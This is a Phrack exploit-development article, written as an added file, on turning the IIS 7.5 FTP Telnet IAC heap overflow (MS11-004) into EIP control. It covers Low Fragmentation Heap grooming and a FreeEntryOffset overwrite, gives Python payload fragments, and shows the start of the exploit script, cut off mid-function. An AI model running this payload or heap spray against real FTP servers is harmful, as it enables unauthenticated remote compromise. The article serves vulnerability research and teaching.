@@ -1,0 +1,1093 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x0c of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=-------------=[       The Art of Exploitation       ]=-----------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------=[   Exploiting MS11-004   ]=-----------------------=|
+|=----------=[ Microsoft IIS 7.5 remote heap buffer overflow ]=----------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[  by redpantz  ]=----------------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of Contents
+
+1  - Introduction
+2  - The Setup
+3  - The Vulnerability
+4  - Exploitation Primitives
+5  - Enabling the LFH
+6  - FreeEntryOffset Overwrite
+7  - The Impossible
+8  - Conclusion
+9  - References
+10 - Exploit (thing.py)
+
+
+--[ 1 - Introduction
+
+Exploitation of security vulnerabilities has greatly increased in
+difficulty since the days of the Slammer worm. There have been numerous
+exploitation mitigations implemented since the early 2000's. Many of these
+mitigations were focused on the Windows heap; such as Safe Unlinking and
+Heap Chunk header cookies in Windows XP Service Pack 2 and Safe Linking,
+expanded Encoded Chunk headers, Terminate on Corruption, and many others in
+Windows Vista/7 [1].
+
+The widely deployed implementation of anti-exploitation technologies has
+made gaining code execution from vulnerabilities much more expensive
+(notice that I say "expensive" and not "impossible"). By forcing the
+attacker to acquire more knowledge and spend expansive amounts of research
+time, the vendor has made exploiting these vulnerabilities increasingly
+difficult.
+
+This article will take you through the exploitation process (read: EIP) of
+a heap overflow vulnerability in Microsoft IIS 7.5 (MS11-004) on a 32-bit,
+single-core machine. While the target is a bit unrealistic for the
+real-world, and exploit reliability may be a bit suspect, it does suffice
+in showing that an "impossible to exploit" vulnerability can be leveraged
+for code execution with proper knowledge and sufficient time.
+
+Note: The structure of this article will reflect the steps, in order, taken
+when developing the exploit. It differs from the linear nature of the
+actual exploit because it is designed to show the thought process during
+exploit development. Also, since this article was authored quite some time
+after the initial exploitation process, some steps may have been left out
+(i.e. forgotten); quite sorry about that.
+
+
+--[ 2 - The Setup
+
+A proof of concept was released by Matthew Bergin in December 2010 that
+stated there existed an unauthenticated Denial of Service (DoS) against
+IIS FTP 7.5, which was triggered on Windows 7 Ultimate [3]. The exploit
+appeared to lack precision, so it was decided further investigation was
+necessary.
+
+After creating a test environment, the exploit was run with a debugger
+attached to the FTP process. Examination of the error concluded it wasn't
+a DoS and most likely could be used to achieve remote code execution:
+
+BUGCHECK_STR:
+APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_\
+heap_failure_freelists_corruption
+
+PRIMARY_PROBLEM_CLASS:
+ACTIONABLE_HEAP_CORRUPTION_heap_failure_freelists_corruption
+
+DEFAULT_BUCKET_ID:
+ACTIONABLE_HEAP_CORRUPTION_heap_failure_freelists_corruption
+
+STACK_TEXT:
+77f474cb ntdll!RtlpCoalesceFreeBlocks+0x3c9
+77f12eed ntdll!RtlpFreeHeap+0x1f4
+77f12dd8 ntdll!RtlFreeHeap+0x142
+760074d9 KERNELBASE!LocalFree+0x27
+72759c59 IISUTIL!BUFFER::FreeMemory+0x14
+724ba6e3 ftpsvc!FTP_COMMAND::WriteResponseAndLog+0x8f
+724beff8 ftpsvc!FTP_COMMAND::Process+0x243
+724b6051 ftpsvc!FTP_SESSION::OnReadCommandCompletion+0x3e2
+724b76c7 ftpsvc!FTP_CONTROL_CHANNEL::OnReadCommandCompletion+0x1e4
+724b772a ftpsvc!FTP_CONTROL_CHANNEL::AsyncCompletionRoutine+0x17
+7248f182 ftpsvc!FTP_ASYNC_CONTEXT::OverlappedCompletionRoutine+0x3c
+724a56e6 ftpsvc!THREAD_POOL_DATA::ThreadPoolThread+0x89
+724a58c1 ftpsvc!THREAD_POOL_DATA::ThreadPoolThread+0x24
+724a4f8a ftpsvc!THREAD_MANAGER::ThreadManagerThread+0x42
+76bf1194 kernel32!BaseThreadInitThunk+0xe
+77f1b495 ntdll!__RtlUserThreadStart+0x70
+77f1b468 ntdll!_RtlUserThreadStart+0x1b
+
+While simple write-4 primitives have been extinct since the Windows XP SP2
+days [1], there was a feeling that currently known, but previously unproven
+techniques could be leveraged to gain code execution. Adding fuel to the
+fire was a statement from Microsoft stating that the issue "is a Denial of
+Service vulnerability and remote code execution is unlikely" [4].
+
+With the wheels set in motion, it was time to figure out the vulnerability,
+gather exploitation primitives, and subvert the flow of execution by any
+means necessary...
+
+
+--[ 3 - The Vulnerability
+
+The first order of business was to figure out the root cause of the
+vulnerability. Understanding the root cause of the vulnerability was
+integral into forming a more refined and concise proof of concept that
+would serve as a foundation for exploit development.
+
+As stated in the TechNet article, the flaw stemmed from an issue when
+processing Telnet IAC codes [5]. The IAC codes permit a Telnet client to
+tell the Telnet server various commands within the session. The 0xFF
+character denotes these commands. TechNet also describes a process that
+requires the 0xFF characters to be 'escaped' when sending a response by
+adding an additional 0xFF character.
+
+Now that there is context around the vulnerability, the corresponding crash
+dump can be further analyzed. Afterwards we can open the binary in
+IDA Pro and attempt to locate the affected code.  Unfortunately, after
+statically cross-referencing the function calls from the stack trace, there
+didn't seem to be any functions that performed actions on Telnet IAC codes.
+While breakpoints could be set on any of the functions in the stack trace,
+another path was taken.
+
+Since the public symbols named most of the important functions within the
+ftpsvc module, it was deemed more useful to search the function list than
+set debugger breakpoints. A search was made for any function starting with
+'TELNET', resulting in 'TELNET_STREAM_CONTEXT::OnReceivedData' and
+'TELNET_STREAM_CONTEXT::OnSendData'. The returned results proved to be
+viable after some quick dynamic analysis when sending requests and
+receiving responses.
+
+The OnReceivedData function was investigated first, since it was the first
+breakpoint that was hit. Essentially the function attempts to locate Telnet
+IAC codes (0xFF), escape them, parse the commands and normalize the
+request. Unfortunately it doesn't account for seeing two consecutive IAC
+codes.
+
+The following is pseudo code for important portions of OnReceivedData:
+
+TELNET_STREAM_CONTEXT::OnReceivedData(char *aBegin,
+                            DATA_STEAM_BUFFER *aDSB, ...)
+{
+    DATA_STREAM_BUFFER *dsb = aDSB;
+    int len = dsb->BufferLength;
+    char *begin = dsb->BufferBegin;
+    char *adjusted = dsb->BufferBegin;
+    char *end = dsb->BufferEnd;
+    char *curr = dsb->BufferBegin;
+
+    if(len >= 3)
+    {
+        //0xF2 == 242 == Data Mark
+        if(begin[0] == 0xFF && begin[1] == 0xFF && begin[2] == 0xF2)
+            curr = begin + 3;
+    }
+
+    bool seen_iac = false;
+    bool seen_subneg = false;
+    if(curr >= end)
+        return 0;
+
+    while(curr < end)
+    {
+        char curr_char = *curr;
+
+        //if we've seen an iac code
+        //look for a corresponding cmd
+        if(seen_iac)
+        {
+            seen_iac = false;
+            if(seen_subneg)
+            {
+                seen_subneg = false;
+                if(curr_char < 0xF0)
+                    *adjusted++ = curr_char;
+            }
+            else
+            {
+                if(curr_char != 0xFA)
+                {
+                    if(curr_char != 0xFF)
+                    {
+                        if(curr_char < 0xF0)
+                        {
+                            PuDbgPrint("Invalid command %c", curr_char)
+
+                            if(curr_char)
+                                *adjusted++ = curr_char;
+                        }
+                    }
+                    else
+                    {
+                        if(curr_char)
+                            *adjusted++ = curr_char;
+                    }
+                }
+                else
+                {
+                    seen_iac = true;
+                    seen_subneg = true;
+                }
+            }
+
+        }
+        else
+        {
+            if(curr_char == 0xFF)
+                seen_iac = true;
+            else
+                if(curr_char)
+                    *adjusted++ = curr_char;
+        }
+
+        curr++;
+    }
+
+    dsb->BufferLength = adjusted - begin;
+    return 0;
+}
+
+The documentation states Telnet IAC codes can be used by: "Either end of a
+Telnet conversation can locally or remotely enable or disable an option".
+The diagram below represents the 3-byte IAC command within the overall
+Telnet connection stream:
+
+0x0                          0x2
+--------------------------------
+[IAC][Type of Operation][Option]
+--------------------------------
+
+Note: The spec should have been referenced before figuring out the
+vulnerability, instead of reading the code and attempting to figure out
+what could go wrong.
+
+Although there is code to escape IAC characters, the function does not
+except to see two consecutive 0xFF characters in a row. Obviously this
+could be a problem, but it didn't appear to contain any code that would
+result in overflow. Thinking about the TechNet article recalled the line
+'error in the response', so the next logical function to examine was
+'OnSendData'.
+
+Shortly into the function it can be seen that OnSendData is looking for
+IAC (0xFF) codes:
+
+.text:0E07F375 loc_E07F375:
+.text:0E07F375      inc     edx
+.text:0E07F376      cmp     byte ptr [edx], 0FFh
+.text:0E07F379      jnz     short loc_E07F37C
+.text:0E07F37B      inc     edi
+.text:0E07F37C
+.text:0E07F37C loc_E07F37C:
+.text:0E07F37C      cmp     edx, ebx
+.text:0E07F37E      jnz     short loc_E07F375 ; count the number
+                                              ; of "0xFF" characters
+
+The following pseudo code represents the integral pieces of OnSendData:
+
+TELNET_STREAM_CONTEXT::OnSendData(DATA_STREAM_BUFFER *dsb)
+{
+    char *begin = dsb->BufferBegin;
+    char *start = dsb->BufferBegin;
+    char *end = dsb->BufferEnd;
+    int len = dsb->BufferLength;
+    int iac_count = 0;
+
+    if(begin + len == end)
+        return 0;
+
+    //do a total count of the IAC codes
+    do
+    {
+        start++;
+        if(*start == 0xFF)
+            iac_count++;
+    }
+    while(start < end);
+
+    if(!iac_count)
+        return 0;
+
+    for(char *c = begin; c != end; *begin++ = *c)
+    {
+        c++;
+        if(*c == 0xFF)
+            *begin++ == 0xFF;
+    }
+
+    return 0;
+}
+
+As you can see, if the function encounters a 0xFF that is NOT separated by
+at least 2-bytes then there is a potential to escape the code more than
+once, which will eventually lead to a heap corruption into adjacent memory
+based on the size of the request and amount of IAC codes.
+
+For example, if you were to send the string
+"\xFF\xBB\xFF\xFF\xFF\xBB\xFF\xFF" to the server, OnReceivedData produces
+the values:
+
+    1) Before OnReceivedData
+
+        a. DSB->BufferLength = 8
+
+        b. DSB->Buffer = "\xFF\xBB\xFF\xFF\xFF\xBB\xFF\xFF"
+
+    2) After OnReceivedData
+
+        a. DSB->BufferLength = 4
+
+        b. DSB->Buffer = "\xBB\xFF\xBB\xFF"
+
+Although OnReceivedData attempted to escape the IAC codes, it didn't expect
+to see multiple 0xFFs within a certain range; therefore writing the
+illegitimate values at an unacceptable range for OnSendData. Using the same
+string from above, OnSendData would write multiple 0xFF characters past the
+end of the buffer due to de-synchronization in the reading and writing into
+the same buffer.
+
+Now that it is known that a certain amount of 0xFF characters can be
+written past the end of the buffer, it is time to think about an
+exploitation strategy and gather primitives...
+
+
+--[ 4 - Exploitation Primitives
+
+Exploitation primitives can be thought of as the building blocks of exploit
+development. They can be as simple as program functionality that produces a
+desired result or as complicated as a 1-to-n byte overflow. The section
+will cover many of the primitives used within the exploit.
+
+In-depth knowledge of the underlying operating system usually proves to be
+invaluable information when writing exploits. This holds true for the IIS
+FTP exploit, as intricate knowledge of the Windows 7 Low Fragmentation Heap
+served as the basis for exploitation.
+
+It was decided that the FreeEntryOffset Overwrite Technique [2] would be
+used due to the limited ability of the attacker to control the contents of
+the overflow. The attack requires the exploiter to enable the low
+fragmentation heap, position a chunk under the exploiter's control before a
+free chunk (implied same size) within the same UserBlock, write at least 10
+bytes past the end of its buffer, and finally make two subsequent requests
+that are serviced from the same UserBlock. [Yes, it's just that easy ;)]
+
+The following diagram shows how the FreeEntryOffset is utilized when making
+allocations. The first allocation comes from a virgin UserBlock, setting
+the FreeEntryOffset to the first two-byte value stored in the current free
+chunk. Notice there is no validation when updating the FreeEntryOffset. For
+MUCH more information on the LFH and exploitation techniques please see the
+references section:
+
+Allocation 1
+FreeEntryOffset = 0x10
+---------------------------------
+|Header|0x10|      Free         |
+---------------------------------
+|Header|0x20|      Free         |
+---------------------------------
+|Header|0x30|      Free         |
+---------------------------------
+
+Allocation 2
+FreeEntryOffset = 0x20
+---------------------------------
+|Header|           Used         |
+---------------------------------
+|Header|0x20|      Free         |
+---------------------------------
+|Header|0x30|      Free         |
+---------------------------------
+
+Allocation 3
+FreeEntryOffset = 0x30
+---------------------------------
+|Header|           Used         |
+---------------------------------
+|Header|           Used         |
+---------------------------------
+|Header|0x30|      Free         |
+---------------------------------
+
+Now look at the allocation sequence if we have the ability to overwrite a
+FreeEntryOffset with 0xFFFF:
+
+Allocation 1
+FreeEntryOffset = 0x10
+---------------------------------
+|Header|0x10|      Free         |
+---------------------------------
+|Header|0x20|      Free         |
+---------------------------------
+|Header|0x30|      Free         |
+---------------------------------
+
+Allocation 2
+FreeEntryOffset = 0x20
+---------------------------------
+|Header|FFFFFFFFFFFFFFF         |
+---------------------------------
+|Header|FFFF|      Free         |
+---------------------------------
+|Header|0x30|      Free         |
+---------------------------------
+
+Allocation 3
+FreeEntryOffset = 0xFFFF
+---------------------------------
+|Header|           Used         |
+---------------------------------
+|Header|           Used         |
+---------------------------------
+|Header|0x30|      Free         |
+---------------------------------
+
+As you can see, if we can overwrite the FreeEntryOffset with a value of
+0xFFFF then our next allocation will come from unknown heap memory at
+&UserBlock + 8  + (8 * (FreeEntryOffset & 0x7FFF8)) [2]. This may or may
+not point to committed memory for the process, but still provides a good
+starting point for turning a semi-controlled overwrite to a
+fully-controlled overwrite.
+
+
+--[ 5 - Enabling the LFH
+
+If you have read 'Understanding the Low Fragmentation Heap' [2] you'll know
+that it has 'lazy' activation, which means, although it is the default
+front-end allocator, it isn't enabled until a certain threshold is
+exceeded. The most common trigger for enabling the LFH is 16 consecutive
+allocations of the same size.
+
+    for i in range(0, 17):
+        name = "lfh" + str(i)
+        payload = gen_payload(0x40, "X")
+        lfhpool.alloc(name, payload)
+
+You would assume that after making the aforementioned requests
+LFH->HeapBucket[0x40] would be enabled and all further requests for size
+0x40 would be serviced via the LFH; unfortunately this was not the case.
+
+This lead to some memory profiling using Immunity Debugger's '!hippie'
+command. After creating and sending many commands and logging heap
+allocations, a pattern of 0x100 byte allocations emerged. This was quite
+peculiar because requests of 0x40 bytes were being sent. Tracing the
+allocations for 0x100 found that the main consumer of the 0x100 byte
+allocations was FTP_SESSION::WriteResponseHelper; our binary audit can
+finally start!
+
+Note: If some thought would have been put in before brute forcing sizes it
+would have been noted that this is a C++ application which means that
+request data was most likely kept in some buffer or string class; instead
+of being allocated to a specific request size.
+
+Low and behold, looking at the WriteResponseHelper function validated our
+speculation. The function used a buffer class that would allocate 0x100
+bytes and extend itself when necessary:
+
+.text:0E074E7A  mov    eax, [ebp+arg_C] ; dword ptr [eax] == request string
+.text:0E074E7D  push   edi
+.text:0E074E7E  mov    edi, [ebp+arg_8]
+.text:0E074E81  mov    [ebp+vFtpRequest], eax
+.text:0E074E87  mov    esi, 100h
+.text:0E074E8C  push   esi              ; init_size == 0x100
+.text:0E074E8D  lea    eax, [ebp+var_204]
+.text:0E074E93  mov    [ebp+var_27C], ecx
+.text:0E074E99  push   eax
+.text:0E074E9A  lea    ecx, [ebp+var_234]
+.text:0E074EA0  call   ds:STRA::STRA(char *,ulong)
+
+Next, there is a loop to determine if the normalized request string can fit
+in the STRA object:
+
+.text:0E074F59  call   ds:STRA::QuerySize(void)
+.text:0E074F5F  add    eax, eax
+.text:0E074F61  push   eax
+.text:0E074F62  lea    ecx, [ebp+vSTRA1]
+.text:0E074F68  call   ds:STRA::Resize(ulong)
+
+Finally, the STRA object will append the user request data to the server
+response code (for example: "500 "):
+
+.text:0E0750B4  push   [ebp+vFtpRequest]
+.text:0E0750BA  call   ds:STRA::Append(char const *) ; this is where the
+                                                     ; resize happens
+.text:0E0750C0  mov    esi, eax
+.text:0E0750C2  cmp    esi, ebx
+.text:0E0750C4  jl     loc_E07515F     ; if(!STRA::Apend(vFtpRequest))
+                                       ; { destory_objects(); }
+.text:0E0750CA  push   offset SubStr   ; "\r\n"
+.text:0E0750CF  lea    ecx, [ebp+var_234]
+.text:0E0750D5  call   ds:STRA::Append(char const *)
+
+Looking into the STRA:Append(char const*) function, a constant value is
+added when there is not enough space to append to the current STRA object:
+
+.text:6C9DAAE7  cmp    ebx, edx
+.text:6C9DAAE9  ja     short loc_6C9DAB3D ; if enough room, copy
+                                          ; and update size
+.text:6C9DAAEB  jb     short loc_6C9DAAF2 ; otherwise add 0x80
+                                          ; and resize the BUFFER
+.text:6C9DAAED  cmp    [edi+24h], esi
+.text:6C9DAAF0  jnb    short loc_6C9DAB3D
+.text:6C9DAAF2
+.text:6C9DAAF2 loc_6C9DAAF2:
+.text:6C9DAAF2  xor    esi, esi
+.text:6C9DAAF4  cmp    [ebp+arg_C], esi
+.text:6C9DAAF7  jz     short loc_6C9DAB00
+.text:6C9DAAF9  add    eax, 80h        ; eax = buffer.size
+
+Finally the buffer is resized if necessary and the old data is copied over:
+
+.text:6C9DAB1B  push   eax             ; uBytes
+.text:6C9DAB1C  mov    ecx, edi
+.text:6C9DAB1E  call   ?Resize@BUFFER@@QAEHI@Z ; BUFFER::Resize(uint)
+.text:6C9DAB23  test   eax, eax
+.text:6C9DAB25  jnz    short loc_6C9DAB3D
+.text:6C9DAB27  call   ds:__imp_GetLastError
+.text:6C9DAB2D  cmp    eax, esi
+.text:6C9DAB2F  jle    short loc_6C9DAB64
+.text:6C9DAB31  and    eax, 0FFFFh
+.text:6C9DAB36  or     eax, 80070000h
+.text:6C9DAB3B  jmp    short loc_6C9DAB64
+.text:6C9DAB3D
+.text:6C9DAB3D loc_6C9DAB3D:
+.text:6C9DAB3D
+.text:6C9DAB3D  mov    ebx, [ebp+Size]
+.text:6C9DAB40  mov    eax, [edi+20h]
+.text:6C9DAB43  mov    esi, [ebp+arg_8]
+.text:6C9DAB46  push   ebx             ; Size
+.text:6C9DAB47  push   [ebp+Src]       ; Src
+.text:6C9DAB4A  add    eax, esi
+.text:6C9DAB4C  push   eax             ; Dst
+.text:6C9DAB4D  call   memcpy
+
+Now that it is known buffers will be sized in multiples of 0x80 (i.e.
+0x100, 0x180, 0x200, etc), the LFH can be activated accordingly (by size).
+The size of 0x180 was chosen because 0x100 is used for most, if not all,
+initial responses, but _any_ valid size could be used.
+
+    for i in range(0, LFHENABLESIZE):
+        name = "lfh" + str(i)
+        payload = gen_payload(0x180, "X")
+        lfhpool.alloc(name, payload)
+
+
+--[ 6 - FreeEntryOffset Overwrite
+
+It has already been verified that the vulnerability results in an overflow
+of 0xFF characters into an adjacent heap chunk. Therefore the ability to
+enable the LFH for a certain size results in the trivial overwriting of an
+adjacent FreeEntryOffset.
+
+For this exploitation technique to work, the LFH must be enabled while
+ensuring that the UserBlock maintains a few free chunks to service requests
+necessary for exploitation.
+
+Fortunately, this was quite easy to guarantee while on a single core
+machine:
+
+    for i in range(0, LFHENABLESIZE):
+        name = "lfh" + str(i)
+        payload = gen_payload(0x180, "X")
+        lfhpool.alloc(name, payload)
+
+    print "[*] Sending overflow payload"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
+    data = s.recv(1024)
+
+    buf = "\xff\xbb\xff\xff" * 112 + "\r\n" #ends up allocation 0x180
+                                            #(0x188 after chunk header)
+
+    print "[*] Sending %d 0xFFs in the whole payload" % countff(buf)
+    print "[*] Sending Payload...(%d bytes)" % len(buf)
+    analyze(buf)
+    s.send(buf)
+    s.close()
+
+These small portions of code are enough to enable the LFH and overwrite a
+free adjacent chunk after the overflow-able piece of memory. Now when
+subsequent allocations are made for 0x180 bytes, a bad free entry offset
+will be used, providing the application with unexpected memory for
+appending the response.
+
+The above describes the following:
+
+FreeEntryOffset = 0x1
+0         1           2                3
+[UsedChunk][FreeChunk][OverflowedChunk][FreeChunk]
+.
+.
+.
+[UnknownMemory @ UserBlock + (0xFFFF * 8)]
+
+Three subsequent allocations will accomplish the following:
+
+    1) Allocate FreeChunk at FreeEntryOffset 0x1
+
+    2) Allocate OverflowedChunk (which is also free) updating
+       the FreeEntryOffset to 0xFFFF
+
+    3) Allocate memory at UserBlock + 0xFFFF (instead of offset 0x3)
+
+This means the bad FreeEntryOffset will result in data being completely
+controlled by the attacker.
+
+Note: Although quite easily achieved on a single-core machine, heap
+determinism can be much harder on a multi-core platform. Determinism can
+be much more difficult because each core will effectively have its own
+UserBlocks, making chunk placement dependent on which thread services
+a request. While a multi-core machine doesn't make this vulnerability
+completely un-exploitable it does increase the difficulty and decrease
+the reliability.
+
+Overwriting the FreeEntryOffset with 0xFFFF has turned a limited heap
+overflow into a write-n, fully controlled overflow; since the heap chunk
+allocated will be 100% populated with user-controlled data. There is only
+one HUGE problem. What should be overwritten? This ended up being the most
+challenging and least reliable portion of the exploit and could still be
+further refined.
+
+
+--[ 7 - The Impossible
+
+In all honesty, the previous few steps were basic vulnerability analysis,
+rudimentary Python and requisite knowledge of Windows 7 heap internals. The
+most difficult and time consuming-portion is explained below.
+
+The techniques described below had varying degrees of reliability and might
+not even be the best choice for exploitation. The most valuable knowledge
+to take away will be the process of finding an object to overwrite and
+seeding those objects remotely within the heap.
+
+As stated previously, figuring out WHAT to overwrite is quite a problem.
+Not only does a sufficient object, function, or variable, need to be
+unearthed but that item needs to reside in memory where the 'bad'
+allocation points to.
+
+A starting point for locating what to overwrite began with the functions'
+list. The function list was chosen because public symbols were available,
+providing descriptive names for the most important functions. Also, since
+the application was written in C++ it was assumed that there would be
+virtual functions that stored function pointers somewhere in memory.
+
+The first noticeable item that looked redeeming was FTP_COMMAND class. The
+class will most certainly be instantiated when receiving new commands and
+also contains a vtable.
+
+.text:0E073B7D public: __thiscall FTP_COMMAND::FTP_COMMAND(void) proc near
+.text:0E073B7D  mov    edi, edi
+.text:0E073B7F  push   ebx
+.text:0E073B80  push   esi
+.text:0E073B81  mov    esi, ecx
+.text:0E073B83  push   edi
+.text:0E073B84  lea    ecx, [esi+0Ch]
+.text:0E073B87  mov    dword ptr [esi], offset const FTP_COMMAND::`vftable'
+
+It also contained a function pointer that had the same name as one in our
+stack trace, albeit in a different class.
+
+.text:0E073C8D  mov    dword ptr [ebx+8],
+            offset FTP_COMMAND::AsyncCompletionRoutine(FTP_ASYNC_CONTEXT *)
+
+Note: If the stack trace would have been examined more thoroughly, it would
+have been obvious that this wasn't the correct choice, as you will see
+below.
+
+At first glance this seemed to be the perfect fit. A breakpoint was set in
+ntdll!RtlpLowFragHeapAllocFromContext() after the initial overflow had
+occurred and appeared to be populated with FTP_COMMAND objects!
+Unfortunately, there didn't seem to be a remote command that could trigger
+a virtual function call within the FTP_COMMAND object at the time of an
+attacker's choosing.
+
+Note: Although summed up in one paragraph, this actually took quite some
+time to figure out, as the ability to overwrite a function pointer severely
+clouded judgment.
+
+Failure led to flailing around in an attempt to populate heap memory with
+objects that were remotely user-controlled without authentication.
+Eventually, the thought of each FTP_COMMAND having a specific session came
+to mind. The FTP_SESSION class was more closely examined (which was also in
+the stack trace; although this stack trace would eventually change with
+different heap layouts).
+
+The real question was 'Can this function be reliably triggered at given
+time X with user input Y?' Some testing took place and indeed, this server
+was truly asynchronous ;). FTP, being a lined based protocol, requires an
+end of line / end of command delimiter. The server will actually wait to
+process the command until it has received the entire line [6].
+
+Perhaps a FTP_SESSION object that is associated with a FTP_COMMAND could be
+overwritten, leading to control of a virtual function call. Step tracing
+was used throughout FTP_COMMAND::WriteResponseWithErrorTextAndLog and ended
+up at the FTP_SESSION::Log() function. This function contained multiple
+virtual function calls such as:
+
+.text:0E0761C4      mov     ecx, [edi+3D8h]
+.text:0E0761CA      lea     eax, [ebp+var_1B4]
+.text:0E0761D0      push    eax             ; int
+.text:0E0761D1      push    [ebp+dwFlags]   ; CodePage
+.text:0E0761D7      mov     eax, [ecx]
+.text:0E0761D9      call    dword ptr [eax+18h]
+
+Now that there is a potential known function pointer in memory to be
+overwritten, how can it be called? Surprisingly it was quite simple. By
+leaving the trailing '\n' off the end of a command, setting up the heap,
+and then sending the end of line delimiter, a call to "call dword ptr
+[eax+18h]" with full control of EAX could be triggered.
+
+0:006> r
+eax=43434343 ebx=013f2a60 ecx=0145dc98 edx=0104f900 esi=013dfb98
+edi=013f2a60
+eip=70b661d9 esp=0104f690 ebp=0104f984 iopl=0       nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000   efl=00010246
+ftpsvc!FTP_SESSION::Log+0x16b:
+70b661d9 ff5018     call    dword ptr [eax+18h] ds:0023:4343435b=????????
+
+0:006> k
+ChildEBP RetAddr
+0104f984 70b6a997 ftpsvc!FTP_SESSION::Log+0x16b
+0104fa30 70b6ee86
+ftpsvc!FTP_COMMAND::WriteResponseWithErrorTextAndLog+0x188
+0104fa48 70b66051 ftpsvc!FTP_COMMAND::Process+0xd1
+0104fa88 70b676c7 ftpsvc!FTP_SESSION::OnReadCommandCompletion+0x3e2
+0104faf0 70b6772a ftpsvc!FTP_CONTROL_CHANNEL::OnReadCommandCompletion+0x1e4
+0104fafc 70b3f182 ftpsvc!FTP_CONTROL_CHANNEL::AsyncCompletionRoutine+0x17
+0104fb08 70b556e6 
+ftpsvc!FTP_ASYNC_CONTEXT::OverlappedCompletionRoutine+0x3c
+
+Tracing the function during non-exploitation attempts revealed that the
+function was attempting to get the username (if one existed) for logging
+purposes.
+
+1b561d9 ff5018      call    dword ptr [eax+18h]
+        ds:0023:71b23a38={ftpsvc!USER_SESSION::QueryUserName (71b37823)}
+
+Note: Again, this wasn't directly obvious by looking at the function. There
+was quite a bit of static and dynamic analysis to determine the function's
+usefulness.
+
+Although the ability to spray the heap with FTP_COMMAND and FTP_SESSION
+objects is possible, it is not as reliable as originally expected. Many
+factors such as number of connections, the low fragmentation heap setup
+(i.e. number of cores on the server) and many others come into play when
+attempting to exploit this vulnerability.
+
+For example, the amount of LFH chunks and the number of connections to the
+server ended up having quite an effect on the reliability of the exploit,
+which hovered around 60%. These both contributed to which address the
+misaligned allocation pointed and the contents of the memory.
+
+
+--[ 8 - Conclusion
+
+Although Microsoft and many others claimed that this vulnerability would be
+impossible to exploit for code execution, this paper shows that with the
+correct knowledge and enough determination, impossible turns to difficult.
+
+To recap the exploitation process:
+
+    1) Figure out the vulnerability
+
+    2) Familiarize oneself with how heap memory is managed
+
+    3) Obtain in-depth knowledge of the operating system's memory managers
+
+    4) Prime the LFH to a semi-deterministic state
+
+    5) Send a request to overflow an adjacent chunk on the LFH
+
+    6) Create numerous connections in an attempt to populate the heap with
+       FTP_SESSION objects; which will create USER_SESSION objects as well
+
+    7) Send an unfinished request on the previously created connections
+
+    8) Make 3 allocations from the LFH for same size as your overflowable
+       chunk
+
+        a. 1st == Allocate and overflow into next chunk
+
+        b. 2nd == FreeEntryOffset will be set to 0xFFFF
+
+        c. 3rd == Allocation will (hopefully) point to memory which points
+           to a FTP_SESSION object containing a USER_SESSION class;
+           completely overwriting the function pointer in memory
+
+    9) Finish the command from the connection pool by sending a trailing
+       '\n', which in turn calls the OverlappedCompletionRoutine(),
+       therefore calling the FTP_SESSION::Log() function in the process
+
+    10) This will obtain EIP with multiple registers pointing to
+        user-controlled data. From there ASLR and DEP will need to be
+        subverted to gain code execution. Take a look at
+        DATA_STREAM_BUFFER.Size, which will determine how many bytes are
+        sent back to a user in a response
+
+Although full arbitrary code execution wasn't achieved in the exploit, it
+still proves that a remote attacker can potentially gain control over EIP
+via a remote unauthenticated FTP connection that can be used to subvert the
+security posture of the entire system, instead of limiting the scope to a
+denial of service.
+
+The era of simple exploitation is behind us and more exploitation
+primitives must be used when developing modern exploits. By having a strong
+foundation of operating system knowledge and exploitation techniques, you,
+too, can turn impossible bugs into exploitable ones.
+
+
+--[ 9 - References
+
+[1] - Preventing the exploitation of user mode heap corruption
+      vulnerabilities
+      (http://blogs.technet.com/b/srd/archive/2009/08/04/preventing-the-
+       exploitation-of-user-mode-heap-corruption-vulnerabilities.aspx)
+
+[2] - Understanding the Low Fragmentation Heap
+      (http://illmatics.com/Understanding_the_LFH.pdf)
+
+[3] - Windows 7 IIS 7.5 FTPSVC Denial Of Service
+      (http://packetstormsecurity.org/files/96943/
+       Windows-7-IIS-7.5-FTPSVC-Denial-Of-Service.html)
+
+[4] - Assessing an IIS FTP 7.5 Unauthenticated Denial of Service
+      Vulnerability
+      (http://blogs.technet.com/b/srd/archive/2010/12/22/assessing-an-iis-
+       ftp-7-5-unauthenticated-denial-of-service-vulnerability.aspx)
+
+[5] - The Telnet Protocol
+      (http://support.microsoft.com/kb/231866)
+
+[6] - Synchronization and Overlapped Input and Output
+      (http://msdn.microsoft.com/en-us/library/windows/desktop/
+       ms686358(v=vs.85).aspx)
+
+
+--[ 10 - Exploit (thing.py)
+
+
+import socket, sys, os, time
+
+#Connection Info
+HOST = "192.168.11.129"
+PORT = 21
+WAITP = 1
+
+#Good Combo (60% reliability)
+#LFHENABLESIZE = 0x78
+#CONNCOUNT = 0x103
+#=> FTP_SESSION::Log+0x16B
+#call    dword ptr [eax+18h]  ds:0023:2424243c=????????
+
+#The number of allocations to enabled the LFH for our chosen size
+LFHENABLESIZE = 0x78
+LFHPOOLSIZE = LFHENABLESIZE + 0x3
+
+#Each connection will create X amount of FTP_SESSION objects, which
+#contain the virtual function we're trying to overwrite.
+CONNCOUNT = 0x103
+
+class SoftAlloc:
+    s = 0
+
+    #Notice that the connection doesn't do a 'self.s.recv()'
+    #This is a way to restrict un-needed calls to the completionroute
+    def setup(self):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((HOST, PORT))
+
+    def alloc(self, data):
+        self.s.send(data)
+
+    def complete(self):
+        self.buf = self.s.recv(1024)
+
+    def free(self):
+        self.s.close()
+
+#Pools are just a way to keep track of connections
+#It could have just as easily been an array of sockets
+class SoftLeak:
+
+    def __init__(self):
+        self.stag = {}
+        self.untagged = []
+
+    def create_pool(self, num):
+        for i in range(0, num):
+            sa = SoftAlloc()
+            sa.setup()
+            self.untagged.append(sa)
+
+    def clear_pool(self):
+        while(len(self.untagged) > 0):
+            sa = self.untagged.pop()
+            sa.free()
+
+    def alloc(self, tag, payload):
+        if tag in self.stag:
+            print "Error: Tag in use %s\n" % tag
+            sys.exit()
+
+        if len(self.untagged) > 0:
